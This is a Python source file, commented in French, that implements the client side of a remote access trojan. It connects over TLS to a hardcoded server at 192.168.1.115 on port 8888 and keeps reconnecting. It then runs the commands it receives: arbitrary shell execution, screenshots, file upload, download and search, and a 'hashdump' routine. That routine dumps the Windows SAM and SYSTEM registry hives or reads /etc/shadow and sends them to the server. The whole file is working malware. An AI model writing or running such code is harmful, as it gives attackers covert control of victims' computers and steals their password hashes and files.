import socket
import ssl
import subprocess
import time
import base64
import threading
import os
import io
import sys

# Ajout du répertoire parent au chemin système pour trouver les modules utilitaires
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Importation des modules utilitaires
from utils.system_info import SystemInfo
from utils.file_upload import FileUpload
from utils.file_download import FileDownload
from utils.file_search import FileSearch
from utils.network_info import NetworkInfo
from utils.command_help import CommandHelp

# Importation de pyscreenshot pour la capture d'écran
try:
    import pyscreenshot
except ImportError:
    print("[-] Error: pyscreenshot module not found. Install it using 'pip install pyscreenshot'")
    sys.exit(1)

def check_privileges():
    # Vérification des privilèges administratifs
    if os.name == 'nt':
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.geteuid() == 0

class CLIENT:
    SOCK = None

    def __init__(self, ip, port):
        self.ipaddress = ip
        self.port = port

    def send_data(self, data, encode=True):
        # Envoi des données au serveur, avec ou sans encodage en base64
        if encode:
            self.SOCK.sendall(base64.b64encode(data.encode('utf-8')))
        else:
            self.SOCK.sendall(base64.b64encode(data))

    def execute(self, command):
        # Exécution des commandes reçues du serveur
        data = command.decode('utf-8').split(" ", 1)
        if data[0] == "shell":
            try:
                result = subprocess.check_output(data[1], shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            except subprocess.CalledProcessError as e:
                result = str(e)
            self.send_data(result)
        elif data[0] == "screenshot":
            screenshot = pyscreenshot.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            self.send_data(buffer.getvalue(), encode=False)
        elif data[0] == "sysinfo":
            sys_info = SystemInfo()
            self.send_data(sys_info.get_data())
        elif data[0] == "download":
            if len(data) > 1:
                FileDownload.download(self.SOCK, data[1])
            else:
                self.send_data("Error: No file specified for download.")
        elif data[0] == "upload":
            if len(data) > 1:
                destination = data[1]
                self.send_data(b'ready', encode=False)
                FileUpload.upload(self.SOCK, destination)
            else:
                self.send_data("Error: No file specified for upload.")
        elif data[0] == "hashdump":
            self.hashdump()
        elif data[0] == "search":
            if len(data) > 1:
                result = FileSearch.search_file(data[1])
                self.send_data(result)
            else:
                self.send_data("Error: No filename specified for search.")
        elif data[0] == "ipconfig":
            result = NetworkInfo.get_ipconfig()
            self.send_data(result)
        elif data[0] == "help":
            result = CommandHelp.get_help()
            self.send_data(result)

    def hashdump(self):
        # Récupération des hachages de mots de passe
        if os.name == 'nt':
            try:
                sam_file = os.path.join(os.environ['TEMP'], 'sam')
                system_file = os.path.join(os.environ['TEMP'], 'system')
                subprocess.check_output(f"reg save HKLM\\SAM {sam_file}", shell=True)
                subprocess.check_output(f"reg save HKLM\\SYSTEM {system_file}", shell=True)
                with open(sam_file, 'rb') as f:
                    self.send_data(base64.b64encode(f.read()), encode=False)
                with open(system_file, 'rb') as f:
                    self.send_data(base64.b64encode(f.read()), encode=False)
                os.remove(sam_file)
                os.remove(system_file)
            except subprocess.CalledProcessError as e:
                self.send_data(f"Error: {str(e)}")
        else:
            try:
                with open('/etc/shadow', 'r') as file:
                    shadow_data = file.read()
                self.send_data(shadow_data)
            except Exception as e:
                self.send_data(f"Error: {str(e)}")

    def acceptor(self):
        # Réception des commandes du serveur et exécution
        while True:
            try:
                command = base64.b64decode(self.SOCK.recv(4096)).decode('utf-8')
                if command:
                    threading.Thread(target=self.execute, args=(command.encode(),)).start()
            except Exception as e:
                print(f"[DEBUG] Connection closed: {str(e)}")
                break

    def engage(self):
        # Création d'un contexte SSL avec le protocole TLS
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False
        
        # Détection du système d'exploitation et définition du chemin du certificat
        if os.name == 'nt':
            cert_path = os.path.join(os.path.dirname(__file__), '..', 'certificate', 'server.crt')
        else:
            cert_path = os.path.join(os.path.dirname(__file__), '..', 'certificate', 'server.crt')
        
        context.load_verify_locations(cafile=cert_path)
        
        while True:
            try:
                with socket.create_connection((self.ipaddress, self.port)) as sock:
                    with context.wrap_socket(sock, server_hostname=self.ipaddress) as ssock:
                        self.SOCK = ssock
                        print("[DEBUG] Connected to server")
                        self.acceptor()
            except Exception as e:
                print(f"[DEBUG] Connection failed: {str(e)}")
                time.sleep(5)

if __name__ == "__main__":
    if not check_privileges():
        print("[-] Error: This script must be run as root/admin.")
        sys.exit(1)

    client = CLIENT('192.168.1.115', 8888)
    client.engage()
